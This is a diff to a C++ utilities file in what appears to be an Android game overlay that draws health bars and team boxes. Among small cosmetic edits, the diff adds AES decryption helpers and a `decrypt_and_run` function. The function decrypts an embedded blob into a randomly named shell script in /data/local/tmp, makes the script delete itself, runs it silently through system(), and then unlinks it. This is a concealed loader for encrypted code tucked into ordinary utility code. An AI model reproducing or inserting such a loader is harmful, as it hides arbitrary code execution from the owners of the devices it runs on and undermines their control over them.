@@ -1,6 +1,13 @@
 #include "utils/utils.h"
 #include "debug/logger.h"
 #include "utils/farsi_type.h"
+#define AES128 0
+#define AES192 0
+#define AES256 1
+extern "C"
+{
+#include "utils/aes.h"
+}
 
 #include <algorithm>
 #include <fstream>
@@ -8,6 +15,12 @@
 #include <chrono>
 #include <thread>
 #include <cmath>
+#include <vector>
+#include <string_view>
+#include <cstdint>
+#include <random>
+#include <unistd.h>
+#include <sys/stat.h>
 
 static constexpr float GR1 = 0.6180339887498948f; // HUE COLOR
 static constexpr float GR2 = 0.7548776662466927f; // SATURATION COLOR
@@ -160,6 +173,136 @@ namespace Utils
         return result;
     }
 
+    std::vector<uint8_t> hex_to_bytes(std::string_view hex)
+    {
+        auto is_hex = [](char c)
+        { return std::isxdigit(static_cast<unsigned char>(c)); };
+
+        std::vector<uint8_t> out;
+        out.reserve(hex.size() / 2);
+
+        int high = -1;
+        for (char c : hex)
+        {
+            if (!is_hex(c))
+                continue;
+
+            int val = std::isdigit(c) ? c - '0' : std::tolower(c) - 'a' + 10;
+
+            if (high < 0)
+                high = val;
+            else
+            {
+                out.push_back(static_cast<uint8_t>((high << 4) | val));
+                high = -1;
+            }
+        }
+        if (high != -1)
+            throw std::runtime_error("Odd number of hex digits");
+
+        return out;
+    }
+
+    std::vector<uint8_t> aes_ecb_decrypt(
+        const std::vector<uint8_t> &enc,
+        const std::vector<uint8_t> &key)
+    {
+        constexpr size_t BLOCK = 16;
+
+        if (enc.empty() || key.empty())
+            throw std::runtime_error("Empty key or data");
+
+        if (enc.size() % BLOCK != 0)
+            throw std::runtime_error("Cipher length must be multiple of 16");
+
+        std::vector<uint8_t> plain(enc.begin(), enc.end());
+
+        AES_ctx ctx;
+        AES_init_ctx(&ctx, key.data());
+
+        for (size_t i = 0; i < plain.size(); i += BLOCK)
+            AES_ECB_decrypt(&ctx, plain.data() + i);
+
+        bool has_pkcs7 = false;
+        uint8_t pad = plain.back();
+        if (pad >= 1 && pad <= BLOCK)
+        {
+            has_pkcs7 = true;
+            for (size_t i = 1; i <= pad; ++i)
+            {
+                if (plain[plain.size() - i] != pad)
+                {
+                    has_pkcs7 = false;
+                    break;
+                }
+            }
+        }
+        if (has_pkcs7)
+            plain.resize(plain.size() - pad);
+
+        return plain;
+    }
+
+    void dump_vector_as_cpp_array(const std::vector<uint8_t> &data, const std::string &var_name, const std::string &file_path)
+    {
+        FILE *f = fopen(file_path.c_str(), "w");
+        if (!f)
+            throw std::runtime_error("Failed to open file for writing: " + file_path);
+
+        fprintf(f, "static const uint8_t %s[] = {\n    ", var_name.c_str());
+
+        for (size_t i = 0; i < data.size(); ++i)
+        {
+            fprintf(f, "0x%02x", data[i]);
+            if (i + 1 != data.size())
+                fprintf(f, ", ");
+            if ((i + 1) % 12 == 0)
+                fprintf(f, "\n    ");
+        }
+
+        fprintf(f, "\n};\n");
+        fclose(f);
+    }
+
+    std::string random_string(size_t length)
+    {
+        static const char charset[] =
+            "0123456789"
+            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+            "abcdefghijklmnopqrstuvwxyz";
+        static thread_local std::mt19937 generator{std::random_device{}()};
+        static thread_local std::uniform_int_distribution<size_t> dist(0, sizeof(charset) - 2);
+
+        std::string result;
+        result.reserve(length);
+        for (size_t i = 0; i < length; ++i)
+        {
+            result += charset[dist(generator)];
+        }
+        return result;
+    }
+
+    void decrypt_and_run(const std::vector<uint8_t> &enc, const std::vector<uint8_t> &key)
+    {
+        std::vector<uint8_t> plain = Utils::aes_ecb_decrypt(enc, key);
+        if (plain.size() < 2 || plain[0] != '#' || plain[1] != '!')
+            throw std::runtime_error("");
+
+        std::string random_name = random_string(10);
+        std::string script_path = "/data/local/tmp/" + random_name + ".sh";
+        std::ofstream script_file(script_path);
+        if (!script_file.is_open())
+            throw std::runtime_error("");
+
+        script_file << "rm -- \"$0\"\n";
+        script_file.write(reinterpret_cast<const char *>(plain.data()), plain.size());
+        script_file.close();
+        chmod(script_path.c_str(), 0755);
+        std::string exec_cmd = "/system/bin/sh \"" + script_path + "\" > /dev/null 2>&1";
+        int ret = system(exec_cmd.c_str());
+        unlink(script_path.c_str());
+    }
+
     float calculateTextSize(float distance, float minDistance, float maxDistance, float minSize, float maxSize, float exponent)
     {
         float clamped = std::max(minDistance, std::min(distance, maxDistance));
@@ -273,7 +416,7 @@ namespace Utils
             ImU32 healthColor;
             if (healthPercentage > 0.7f)
             {
-                healthColor = color; // أخضر
+                healthColor = color;
             }
             else if (healthPercentage > 0.4f)
             {
@@ -303,13 +446,5 @@ namespace Utils
             ImVec2(teamBoxPos.x + teamBoxSize, barPos.y + barHeight),
             teamColor,
             2.0f * scale);
-
-        draw_list->AddRect(
-            teamBoxPos,
-            ImVec2(teamBoxPos.x + teamBoxSize, teamBoxPos.y + teamBoxSize),
-            IM_COL32(255, 255, 255, 200),
-            2.0f * scale,
-            0,
-            1.0f * scale);
     }
 } // namespace Utils
